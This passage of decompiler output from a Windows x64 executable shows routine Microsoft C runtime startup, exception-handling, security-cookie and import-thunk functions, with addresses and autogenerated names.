      lVar4 = cpuid_Extended_Feature_Enumeration_info(7);
      uVar11 = *(uint *)(lVar4 + 8);
    }
    if (0x23 < *piVar1) {
      lVar4 = cpuid(0x24);
      uVar12 = *(uint *)(lVar4 + 4);
    }
  }
  _DAT_14005d090 = 1;
  DAT_14005d094 = 2;
  uVar9 = DAT_14005d088 & 0xfffffffffffffffe;
  if ((uVar5 >> 0x14 & 1) != 0) {
    _DAT_14005d090 = 2;
    DAT_14005d094 = 6;
    uVar9 = DAT_14005d088 & 0xffffffffffffffee;
  }
  DAT_14005d088 = uVar9;
  if ((uVar5 >> 0x1b & 1) == 0) {
    return 0;
  }
  uVar9 = xinuse(0);
  uVar9 = in_XCR0 & uVar9 & 0xffffffff;
  if (((uVar5 >> 0x1c & 1) == 0) || (bVar6 = (byte)uVar9, (bVar6 & 6) != 6)) goto LAB_140052232;
  _DAT_14005d090 = 3;
  uVar7 = DAT_14005d088;
  uVar5 = DAT_14005d094 | 8;
  if ((uVar8 & 0x20) == 0) {
LAB_1400521c8:
    DAT_14005d094 = uVar5;
    DAT_14005d088 = uVar7;
    uVar7 = DAT_14005d088;
    uVar5 = DAT_14005d094;
  }
  else {
    _DAT_14005d090 = 5;
    uVar7 = DAT_14005d088 & 0xfffffffffffffffd;
    uVar5 = DAT_14005d094 | 0x28;
    if ((uVar8 & 0xd0030000) == 0xd0030000) {
      if ((bVar6 & 0xe0) != 0xe0) goto LAB_1400521c8;
      DAT_14005d094 = DAT_14005d094 | 0x68;
      _DAT_14005d090 = 6;
      uVar7 = DAT_14005d088 & 0xffffffffffffffd9;
      uVar5 = DAT_14005d094;
    }
  }
  DAT_14005d094 = uVar5;
  DAT_14005d088 = uVar7;
  if ((uVar10 >> 0x17 & 1) != 0) {
    DAT_14005d088 = DAT_14005d088 & 0xfffffffffeffffff;
  }
  if (((uVar11 >> 0x13 & 1) != 0) && ((bVar6 & 0xe0) == 0xe0)) {
    _DAT_140a612e8 = uVar12 & 0x400ff;
    DAT_14005d088 = ~((ulonglong)(uVar12 >> 0x10 & 6) | 0x1000029) & DAT_14005d088;
    if (1 < (byte)_DAT_140a612e8) {
      DAT_14005d088 = DAT_14005d088 & 0xffffffffffffffbf;
    }
  }
LAB_140052232:
  if (((uVar11 >> 0x15 & 1) != 0) && ((uVar9 >> 0x13 & 1) != 0)) {
    DAT_14005d088 = DAT_14005d088 & 0xffffffffffffff7f;
  }
  return 0;
}



/* ==================================================================== */
/* __raise_securityfailure @ 140052268 */

/* Library Function - Single Match
    __raise_securityfailure

   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

void __raise_securityfailure(_EXCEPTION_POINTERS *param_1)

{
  HANDLE hProcess;

  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter(param_1);
  hProcess = GetCurrentProcess();
                    /* WARNING: Could not recover jumptable at 0x000140052295. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  TerminateProcess(hProcess,0xc0000409);
  return;
}



/* ==================================================================== */
/* FUN_14005229c @ 14005229c */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14005229c(void)

{
  code *pcVar1;
  BOOL BVar2;
  undefined1 *puVar3;
  undefined1 auStack_38 [8];
  undefined1 auStack_30 [48];

  BVar2 = IsProcessorFeaturePresent(0x17);
  puVar3 = auStack_38;
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)(2);
    puVar3 = auStack_30;
  }
  *(undefined8 *)(puVar3 + -8) = 0x1400522c7;
  FUN_140052370(&DAT_140a61390);
  _DAT_140a61300 = *(undefined8 *)(puVar3 + 0x38);
  _DAT_140a61428 = puVar3 + 0x40;
  _DAT_140a61410 = *(undefined8 *)(puVar3 + 0x40);
  _DAT_140a612f0 = 0xc0000409;
  _DAT_140a612f4 = 1;
  _DAT_140a61308 = 1;
  DAT_140a61310 = 2;
  *(undefined8 *)(puVar3 + 0x20) = DAT_14005d040;
  *(undefined8 *)(puVar3 + 0x28) = DAT_14005d080;
  *(undefined8 *)(puVar3 + -8) = 0x140052369;
  DAT_140a61488 = _DAT_140a61300;
  __raise_securityfailure(&PTR_DAT_140056e60);
  return;
}



/* ==================================================================== */
/* FUN_140052370 @ 140052370 */

void FUN_140052370(PCONTEXT param_1)

{
  DWORD64 ControlPc;
  PRUNTIME_FUNCTION FunctionEntry;
  int iVar1;
  DWORD64 local_res8;
  ulonglong local_res10;
  PVOID local_res18 [2];

  RtlCaptureContext();
  ControlPc = param_1->Rip;
  iVar1 = 0;
  do {
    FunctionEntry = RtlLookupFunctionEntry(ControlPc,&local_res8,(PUNWIND_HISTORY_TABLE)0x0);
    if (FunctionEntry == (PRUNTIME_FUNCTION)0x0) {
      return;
    }
    RtlVirtualUnwind(0,local_res8,ControlPc,FunctionEntry,param_1,local_res18,&local_res10,
                     (PKNONVOLATILE_CONTEXT_POINTERS)0x0);
    iVar1 = iVar1 + 1;
  } while (iVar1 < 2);
  return;
}



/* ==================================================================== */
/* FUN_1400523e4 @ 1400523e4 */

undefined8 * FUN_1400523e4(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad allocation";
  *param_1 = &PTR_FUN_140056e90;
  return param_1;
}



/* ==================================================================== */
/* FUN_140052408 @ 140052408 */

void FUN_140052408(void)

{
  undefined1 local_28 [40];

  FUN_1400523e4(local_28);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_14005a010);
}



/* ==================================================================== */
/* FUN_140052428 @ 140052428 */

undefined8 FUN_140052428(void)

{
  return 1;
}



/* ==================================================================== */
/* __scrt_is_ucrt_dll_in_use @ 140052430 */

/* Library Function - Single Match
    __scrt_is_ucrt_dll_in_use

   Library: Visual Studio 2019 Release */

bool __scrt_is_ucrt_dll_in_use(void)

{
  return DAT_14005d0b0 != 0;
}



/* ==================================================================== */
/* FUN_14005243c @ 14005243c */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14005243c(void)

{
  _DAT_140a61860 = 0;
  return;
}



/* ==================================================================== */
/* FUN_140052448 @ 140052448 */

void FUN_140052448(undefined4 param_1)

{
  code *pcVar1;
  BOOL BVar2;
  LONG LVar3;
  PRUNTIME_FUNCTION FunctionEntry;
  undefined1 *puVar4;
  undefined8 unaff_retaddr;
  undefined8 local_res10;
  undefined1 local_res18 [8];
  undefined1 local_res20 [8];
  undefined1 auStack_5c8 [8];
  undefined1 auStack_5c0 [232];
  undefined1 local_4d8 [152];
  undefined1 *local_440;
  DWORD64 local_3e0;

  BVar2 = IsProcessorFeaturePresent(0x17);
  puVar4 = auStack_5c8;
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)(param_1);
    puVar4 = auStack_5c0;
  }
  *(undefined8 *)(puVar4 + -8) = 0x14005247c;
  FUN_14005243c(3);
  *(undefined8 *)(puVar4 + -8) = 0x14005248d;
  memset(local_4d8,0,0x4d0);
  *(undefined8 *)(puVar4 + -8) = 0x140052497;
  RtlCaptureContext(local_4d8);
  *(undefined8 *)(puVar4 + -8) = 0x1400524b1;
  FunctionEntry = RtlLookupFunctionEntry(local_3e0,&local_res10,(PUNWIND_HISTORY_TABLE)0x0);
  if (FunctionEntry != (PRUNTIME_FUNCTION)0x0) {
    *(undefined8 *)(puVar4 + 0x38) = 0;
    *(undefined1 **)(puVar4 + 0x30) = local_res18;
    *(undefined1 **)(puVar4 + 0x28) = local_res20;
    *(undefined1 **)(puVar4 + 0x20) = local_4d8;
    *(undefined8 *)(puVar4 + -8) = 0x1400524f5;
    RtlVirtualUnwind(0,local_res10,local_3e0,FunctionEntry,*(PCONTEXT *)(puVar4 + 0x20),
                     *(PVOID **)(puVar4 + 0x28),*(PDWORD64 *)(puVar4 + 0x30),
                     *(PKNONVOLATILE_CONTEXT_POINTERS *)(puVar4 + 0x38));
  }
  local_440 = local_res18 + -0x10;
  *(undefined8 *)(puVar4 + -8) = 0x140052527;
  memset(puVar4 + 0x50,0,0x98);
  *(undefined8 *)(puVar4 + 0x60) = unaff_retaddr;
  *(undefined4 *)(puVar4 + 0x50) = 0x40000015;
  *(undefined4 *)(puVar4 + 0x54) = 1;
  *(undefined8 *)(puVar4 + -8) = 0x140052549;
  BVar2 = IsDebuggerPresent();
  *(undefined1 **)(puVar4 + 0x40) = puVar4 + 0x50;
  *(undefined1 **)(puVar4 + 0x48) = local_4d8;
  *(undefined8 *)(puVar4 + -8) = 0x140052566;
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  *(undefined8 *)(puVar4 + -8) = 0x140052571;
  LVar3 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)(puVar4 + 0x40));
  if ((LVar3 == 0) && (BVar2 != 1)) {
    *(undefined8 *)(puVar4 + -8) = 0x140052582;
    FUN_14005243c(3);
  }
  return;
}



/* ==================================================================== */
/* thunk_FUN_14005259c @ 140052594 */

undefined8 thunk_FUN_14005259c(void)

{
  return 0;
}



/* ==================================================================== */
/* FUN_14005259c @ 14005259c */

undefined8 FUN_14005259c(void)

{
  return 0;
}



/* ==================================================================== */
/* FUN_1400525a0 @ 1400525a0 */

bool FUN_1400525a0(void)

{
  HMODULE pHVar1;
  longlong lVar2;
  bool bVar3;

  pHVar1 = GetModuleHandleW((LPCWSTR)0x0);
  if ((((pHVar1 == (HMODULE)0x0) || ((short)pHVar1->unused != 0x5a4d)) ||
      (lVar2 = (longlong)pHVar1[0xf].unused, *(int *)((longlong)&pHVar1->unused + lVar2) != 0x4550))
     || ((*(short *)((longlong)&pHVar1[6].unused + lVar2) != 0x20b ||
         (*(uint *)((longlong)&pHVar1[0x21].unused + lVar2) < 0xf)))) {
    bVar3 = false;
  }
  else {
    bVar3 = *(int *)((longlong)&pHVar1[0x3e].unused + lVar2) != 0;
  }
  return bVar3;
}



/* ==================================================================== */
/* FUN_1400525f4 @ 1400525f4 */

void FUN_1400525f4(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400525fb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  SetUnhandledExceptionFilter(FUN_140052604);
  return;
}



/* ==================================================================== */
/* FUN_140052604 @ 140052604 */

undefined8 FUN_140052604(undefined8 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined8 uVar3;
  undefined8 *puVar4;

  piVar2 = (int *)*param_1;
  if ((*piVar2 == -0x1f928c9d) && (piVar2[6] == 4)) {
    iVar1 = piVar2[8];
    if ((iVar1 == 0x19930520) || ((iVar1 + 0xe66cfadfU < 2 || (iVar1 == 0x1994000)))) {
      puVar4 = (undefined8 *)__current_exception();
      *puVar4 = piVar2;
      uVar3 = param_1[1];
      puVar4 = (undefined8 *)__current_exception_context();
      *puVar4 = uVar3;
                    /* WARNING: Subroutine does not return */
      terminate();
    }
  }
  return 0;
}



/* ==================================================================== */
/* FUN_140052668 @ 140052668 */

void FUN_140052668(void)

{
  DWORD DVar1;
  _FILETIME local_res8;
  LARGE_INTEGER local_res10;
  _FILETIME local_18 [2];

  if (DAT_14005d040 == 0x2b992ddfa232) {
    local_res8.dwLowDateTime = 0;
    local_res8.dwHighDateTime = 0;
    GetSystemTimeAsFileTime(&local_res8);
    local_18[0] = local_res8;
    DVar1 = GetCurrentThreadId();
    local_18[0] = (_FILETIME)((ulonglong)local_18[0] ^ (ulonglong)DVar1);
    DVar1 = GetCurrentProcessId();
    local_18[0] = (_FILETIME)((ulonglong)local_18[0] ^ (ulonglong)DVar1);
    QueryPerformanceCounter(&local_res10);
    DAT_14005d040 =
         ((ulonglong)local_res10.s.LowPart << 0x20 ^
          CONCAT44(local_res10.s.HighPart,local_res10.s.LowPart) ^ (ulonglong)local_18[0] ^
         (ulonglong)local_18) & 0xffffffffffff;
    if (DAT_14005d040 == 0x2b992ddfa232) {
      DAT_14005d040 = 0x2b992ddfa233;
    }
  }
  DAT_14005d080 = ~DAT_14005d040;
  return;
}



/* ==================================================================== */
/* FUN_140052718 @ 140052718 */

undefined8 FUN_140052718(void)

{
  return 0x4000;
}



/* ==================================================================== */
/* FUN_140052720 @ 140052720 */

void FUN_140052720(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052727. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  InitializeSListHead(&DAT_140a61870);
  return;
}



/* ==================================================================== */
/* FUN_140052730 @ 140052730 */

undefined1 FUN_140052730(void)

{
  return 1;
}



/* ==================================================================== */
/* FUN_140052734 @ 140052734 */

undefined * FUN_140052734(void)

{
  return &DAT_140a61880;
}



/* ==================================================================== */
/* FUN_14005273c @ 14005273c */

void FUN_14005273c(void)

{
  ulonglong *puVar1;

  puVar1 = (ulonglong *)FUN_14000ea90();
  *puVar1 = *puVar1 | 0x24;
  puVar1 = (ulonglong *)FUN_140052734();
  *puVar1 = *puVar1 | 2;
  return;
}



/* ==================================================================== */
/* FUN_140052758 @ 140052758 */

bool FUN_140052758(void)

{
  return DAT_14005d0ac == 0;
}



/* ==================================================================== */
/* FUN_140052764 @ 140052764 */

undefined * FUN_140052764(void)

{
  return &DAT_140a619f0;
}



/* ==================================================================== */
/* FUN_14005276c @ 14005276c */

undefined * FUN_14005276c(void)

{
  return &DAT_140a619e8;
}



/* ==================================================================== */
/* FUN_140052774 @ 140052774 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140052774(void)

{
  undefined8 *puVar1;

  for (puVar1 = &DAT_140058570; puVar1 < &DAT_140058570; puVar1 = puVar1 + 1) {
    if ((code *)*puVar1 != (code *)0x0) {
      (*(code *)*puVar1)();
    }
  }
  return;
}



/* ==================================================================== */
/* FUN_1400527b0 @ 1400527b0 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_1400527b0(void)

{
  undefined8 *puVar1;

  for (puVar1 = &DAT_140058580; puVar1 < &DAT_140058580; puVar1 = puVar1 + 1) {
    if ((code *)*puVar1 != (code *)0x0) {
      (*(code *)*puVar1)();
    }
  }
  return;
}



/* ==================================================================== */
/* VCRUNTIME140_1.DLL::__CxxFrameHandler4 @ 1400527f0 */

void __CxxFrameHandler4(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400527f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __CxxFrameHandler4();
  return;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::memcmp @ 140052802 */

int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  int iVar1;

                    /* WARNING: Could not recover jumptable at 0x000140052802. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = memcmp(_Buf1,_Buf2,_Size);
  return iVar1;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::memcpy @ 140052808 */

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;

                    /* WARNING: Could not recover jumptable at 0x000140052808. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::memset @ 14005280e */

void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;

                    /* WARNING: Could not recover jumptable at 0x00014005280e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::__current_exception @ 140052814 */

void __current_exception(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052814. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __current_exception();
  return;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::__current_exception_context @ 14005281a */

void __current_exception_context(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005281a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __current_exception_context();
  return;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::_CxxThrowException @ 140052820 */

void __stdcall _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    /* WARNING: Could not recover jumptable at 0x000140052820. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  _CxxThrowException(pExceptionObject,pThrowInfo);
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-HEAP-L1-1-0.DLL::malloc @ 140052826 */

void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;

                    /* WARNING: Could not recover jumptable at 0x000140052826. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = malloc(_Size);
  return pvVar1;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-HEAP-L1-1-0.DLL::free @ 14005282c */

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x00014005282c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-HEAP-L1-1-0.DLL::_callnewh @ 140052832 */

int __cdecl _callnewh(size_t _Size)

{
  int iVar1;

                    /* WARNING: Could not recover jumptable at 0x000140052832. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = _callnewh(_Size);
  return iVar1;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_configure_narrow_argv @ 140052838 */

void _configure_narrow_argv(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052838. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _configure_narrow_argv();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_initialize_narrow_environment @ 14005283e */

void _initialize_narrow_environment(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005283e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initialize_narrow_environment();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_initialize_onexit_table @ 140052844 */

void _initialize_onexit_table(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052844. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initialize_onexit_table();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_register_onexit_function @ 14005284a */

void _register_onexit_function(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005284a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _register_onexit_function();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_crt_atexit @ 140052850 */

void _crt_atexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052850. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _crt_atexit();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_cexit @ 140052856 */

void __cdecl _cexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052856. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _cexit();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::terminate @ 14005285c */

void terminate(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005285c. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  terminate();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_seh_filter_exe @ 140052862 */

void _seh_filter_exe(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052862. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _seh_filter_exe();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_set_app_type @ 140052868 */

void _set_app_type(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052868. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _set_app_type();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-MATH-L1-1-0.DLL::__setusermatherr @ 14005286e */

void __setusermatherr(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005286e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __setusermatherr();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_get_initial_narrow_environment @ 140052874 */

void _get_initial_narrow_environment(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052874. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _get_initial_narrow_environment();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_initterm @ 14005287a */

void _initterm(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005287a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_initterm_e @ 140052880 */

void _initterm_e(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052880. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm_e();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::exit @ 140052886 */

void __cdecl exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x000140052886. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  exit(_Code);
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_exit @ 14005288c */

void __cdecl _exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x00014005288c. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  _exit(_Code);
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-STDIO-L1-1-0.DLL::_set_fmode @ 140052892 */

errno_t __cdecl _set_fmode(int _Mode)

{
  errno_t eVar1;

                    /* WARNING: Could not recover jumptable at 0x000140052892. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  eVar1 = _set_fmode(_Mode);
  return eVar1;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::__p___argc @ 140052898 */

void __p___argc(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140052898. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p___argc();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::__p___argv @ 14005289e */

void __p___argv(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014005289e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p___argv();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_register_thread_local_exe_atexit_callback @ 1400528aa */

void _register_thread_local_exe_atexit_callback(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400528aa. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _register_thread_local_exe_atexit_callback();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-LOCALE-L1-1-0.DLL::_configthreadlocale @ 1400528b0 */

int __cdecl _configthreadlocale(int _Flag)

{
  int iVar1;

                    /* WARNING: Could not recover jumptable at 0x0001400528b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = _configthreadlocale(_Flag);
  return iVar1;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-HEAP-L1-1-0.DLL::_set_new_mode @ 1400528b6 */

void _set_new_mode(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400528b6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _set_new_mode();
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-STDIO-L1-1-0.DLL::__p__commode @ 1400528bc */

void __p__commode(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400528bc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p__commode();
  return;
}



/* ==================================================================== */
/* FUN_1400528c4 @ 1400528c4 */

void FUN_1400528c4(longlong param_1,undefined8 param_2,undefined8 param_3,longlong param_4)

{
  longlong lVar1;

  lVar1 = *(longlong *)(param_4 + 0x38);
  FUN_140051f6c(param_2,param_4,lVar1 + 4);
  if ((*(uint *)(lVar1 + 4) & ((*(uint *)(param_1 + 4) & 0x66) != 0) + 1) != 0) {
    __CxxFrameHandler4(param_1,param_2,param_3,param_4);
  }
  return;
}



/* ==================================================================== */
/* __chkstk @ 140052960 */

/* WARNING: This is an inlined function */
/* Library Function - Single Match
    __chkstk

   Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012 */

void __chkstk(void)

{
  undefined1 *in_RAX;
  undefined1 *puVar1;
  undefined1 *puVar2;
  undefined1 local_res8 [32];

  puVar1 = local_res8 + -(longlong)in_RAX;
  if (local_res8 < in_RAX) {
    puVar1 = (undefined1 *)0x0;
  }
  if (puVar1 < StackLimit) {
    puVar2 = StackLimit;
    do {
      puVar2 = puVar2 + -0x1000;
      *puVar2 = 0;
    } while ((undefined1 *)((ulonglong)puVar1 & 0xfffffffffffff000) != puVar2);
  }
  return;
}



/* ==================================================================== */
/* VCRUNTIME140.DLL::memmove @ 1400529ae */

void * __cdecl memmove(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;

                    /* WARNING: Could not recover jumptable at 0x0001400529ae. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memmove(_Dst,_Src,_Size);
  return pvVar1;
}



/* ==================================================================== */
/* _guard_dispatch_icall @ 1400529d0 */

/* WARNING: This is an inlined function */

void _guard_dispatch_icall(void)

{
  code *UNRECOVERED_JUMPTABLE;

                    /* WARNING: Could not recover jumptable at 0x0001400529d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)();
  return;
}



/* ==================================================================== */
/* _guard_dispatch_icall @ 1400529f0 */

/* WARNING: This is an inlined function */
/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void _guard_dispatch_icall(void)

{
  code *in_RAX;

  (*in_RAX)();
  return;
}



/* ==================================================================== */
/* FUN_140052a00 @ 140052a00 */

void FUN_140052a00(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x20) & 1) != 0) {
    *(uint *)(param_2 + 0x20) = *(uint *)(param_2 + 0x20) & 0xfffffffe;
    thunk_FUN_14000e720(*(undefined8 *)(param_2 + 0x40));
  }
  return;
}



/* ==================================================================== */
/* FUN_140052a74 @ 140052a74 */

void FUN_140052a74(undefined8 param_1,longlong param_2)

{
  free(*(void **)(param_2 + 0x80));
  return;
}



/* ==================================================================== */
/* FUN_140052ab0 @ 140052ab0 */

void FUN_140052ab0(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x30) & 1) != 0) {
    *(uint *)(param_2 + 0x30) = *(uint *)(param_2 + 0x30) & 0xfffffffe;
    FUN_140023190(*(undefined8 *)(param_2 + 0x60));
  }
  return;
}



/* ==================================================================== */
/* FUN_140052b30 @ 140052b30 */

void FUN_140052b30(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x20) & 1) != 0) {
    *(uint *)(param_2 + 0x20) = *(uint *)(param_2 + 0x20) & 0xfffffffe;
    thunk_FUN_140025000(*(undefined8 *)(param_2 + 0x40));
  }
  return;
}



/* ==================================================================== */
/* FUN_140052cc4 @ 140052cc4 */

void FUN_140052cc4(undefined8 param_1,longlong param_2)

{
  _eh_vector_destructor_iterator_((void *)(param_2 + 0x70),0x30,0xc,FUN_14000fbe0);
  return;
}



/* ==================================================================== */
/* FUN_140052e00 @ 140052e00 */

void FUN_140052e00(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x30) & 1) != 0) {
    *(uint *)(param_2 + 0x30) = *(uint *)(param_2 + 0x30) & 0xfffffffe;
    thunk_FUN_140025000(*(undefined8 *)(param_2 + 0x60));
  }
  return;
}



/* ==================================================================== */
/* FUN_140052e48 @ 140052e48 */

undefined8 FUN_140052e48(undefined8 param_1,longlong param_2)

{
  std::basic_ios<char,std::char_traits<char>_>::setstate
            ((basic_ios<char,std::char_traits<char>_> *)
             ((longlong)*(int *)(**(longlong **)(param_2 + 0x60) + 4) +
             (longlong)*(longlong **)(param_2 + 0x60)),4,true);
  return 0;
}



/* ==================================================================== */
/* FUN_140052e90 @ 140052e90 */

void FUN_140052e90(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x20) & 1) != 0) {
    *(uint *)(param_2 + 0x20) = *(uint *)(param_2 + 0x20) & 0xfffffffe;
    std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
              ((basic_ios<char,std::char_traits<char>_> *)(*(longlong *)(param_2 + 0x30) + 0xa8));
  }
  return;
}



/* ==================================================================== */
/* FUN_140052ef0 @ 140052ef0 */

void FUN_140052ef0(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x38) & 1) != 0) {
    *(uint *)(param_2 + 0x38) = *(uint *)(param_2 + 0x38) & 0xfffffffe;
    std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
              ((basic_ios<char,std::char_traits<char>_> *)(*(longlong *)(param_2 + 0x30) + 0x88));
  }
  return;
}



/* ==================================================================== */
/* FUN_140052f50 @ 140052f50 */

void FUN_140052f50(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x20) & 1) != 0) {
    *(uint *)(param_2 + 0x20) = *(uint *)(param_2 + 0x20) & 0xfffffffe;
    thunk_FUN_140025000(*(undefined8 *)(param_2 + 0x58));
  }
  return;
}



/* ==================================================================== */
/* FUN_14005305e @ 14005305e */

